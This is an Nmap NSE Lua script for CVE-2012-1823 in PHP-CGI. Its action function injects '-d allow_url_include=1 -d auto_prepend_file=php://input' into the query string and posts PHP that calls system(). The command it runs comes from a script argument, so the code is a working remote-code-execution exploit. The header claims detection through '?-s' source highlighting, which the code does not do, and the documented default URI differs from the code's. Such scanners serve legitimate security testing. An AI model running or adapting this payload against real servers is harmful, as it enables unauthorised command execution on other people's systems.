local http = require "http"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local vulns = require "vulns"

description = [[
Detects PHP-CGI installations that are vulnerable to CVE-2012-1823, This
critical vulnerability allows attackers to retrieve source code and execute
code remotely.

The script works by appending "?-s" to the uri to make vulnerable php-cgi
handlers return colour syntax highlighted source. We use the pattern "<span
style=.*>&lt;?" to detect
vulnerable installations.
]]

---
-- @usage
-- nmap -sV --script http-vuln-cve2012-1823 <target>
-- nmap -p80 --script http-vuln-cve2012-1823 --script-args http-vuln-cve2012-1823.uri=/test.php <target>
-- @output
-- PORT   STATE SERVICE REASON
-- 80/tcp open  http    syn-ack
-- | http-vuln-cve2012-1823:
-- |   VULNERABLE:
-- |   PHP-CGI Remote code execution and source code disclosure
-- |     State: VULNERABLE (Exploitable)
-- |     IDs:  CVE:2012-1823
-- |     Description:
-- |       According to PHP's website, "PHP is a widely-used general-purpose
-- |       scripting language that is especially suited for Web development and
-- |       can be embedded into HTML." When PHP is used in a CGI-based setup
-- |       (such as Apache's mod_cgid), the php-cgi receives a processed query
-- |       string parameter as command line arguments which allows command-line
-- |       switches, such as -s, -d or -c to be passed to the php-cgi binary,
-- |       which can be exploited to disclose source code and obtain arbitrary
-- |       code execution.
-- |     Disclosure date: 2012-05-03
-- |     Extra information:
-- |       Proof of Concept:/index.php?-s
-- |     References:
-- |       http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/
-- |       http://cve.mitre.org/cgi-bin/cvename.cgi?name=2012-1823
-- |_      http://ompldr.org/vZGxxaQ
--
-- @args http-vuln-cve2012-1823.uri URI. Default: /index.php
-- @args http-vuln-cve2012-1823.cmd CMD. Default: uname -a
---

author = "Paulino Calderon <calderon@websec.mx>, Paul AMAR <aos.paul@gmail.com>"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"exploit","vuln","intrusive"}


portrule = shortport.http

action = function(host, port)
  local uri = stdnse.get_script_args(SCRIPT_NAME..".uri") or "/"
  local cmd = stdnse.get_script_args(SCRIPT_NAME..".cmd") or "uname -a"

  local vuln = {
       title = 'PHP-CGI Remote code execution and source code disclosure',
       state = vulns.STATE.NOT_VULN, -- default
       IDS = {CVE = '2012-1823'},
       description = [[
According to PHP's website, "PHP is a widely-used general-purpose
scripting language that is especially suited for Web development and
can be embedded into HTML." When PHP is used in a CGI-based setup
(such as Apache's mod_cgid), the php-cgi receives a processed query
string parameter as command line arguments which allows command-line
switches, such as -s, -d or -c to be passed to the php-cgi binary,
which can be exploited to disclose source code and obtain arbitrary
code execution.]],
       references = {
          'http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/',
           'http://ompldr.org/vZGxxaQ',
       },
       dates = {
           disclosure = {year = '2012', month = '05', day = '03'},
       },
     }
  local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)

  stdnse.debug2("Trying detection using echo command")
  local detection_session = http.post(host, port, uri.."?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input", { no_cache = true }, nil, "<?php system('echo NmapCVEIdentification');die(); ?>")
  if detection_session and detection_session.status == 200 then
    if string.match(detection_session.body, "NmapCVEIdentification") then
      stdnse.debug1("The website seems vulnerable to CVE-2012-1823.")
    else
      return
    end
  end

  stdnse.debug2("Trying Command... " .. cmd)
  local exploitation_session = http.post(host, port, uri.."?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input", { no_cache = true }, nil, "<?php system('"..cmd.."');die(); ?>")
  if exploitation_session and exploitation_session.status == 200 then
    stdnse.debug1("Ouput of the command " .. cmd .. " : \n"..exploitation_session.body)
    vuln.state = vulns.STATE.EXPLOIT
    return vuln_report:make_output(exploitation_session.body)
  end
end
